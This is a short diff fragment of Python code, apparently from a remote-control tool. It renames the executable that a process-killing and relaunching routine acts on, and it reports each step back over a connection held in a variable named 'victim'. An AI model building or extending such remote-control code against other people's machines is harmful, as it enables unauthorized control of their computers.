@@ -13,14 +13,14 @@ while True:
         result = f"Error: {e}"
 
 try:
-    os.system('taskkill /f /im VICTIM.exe')
+    os.system('taskkill /f /im Main_Client.exe')
     victim.send("process finished".encode())
 except Exception as e:
     result = f"Error: {e}"
     victim.send(result.encode())
 
 try:
-    os.system('VICTIM.exe')
+    os.system('Main_Client.exe')
     victim.send("process restarted".encode())
 except Exception as e:
     result = f"Error: {e}"
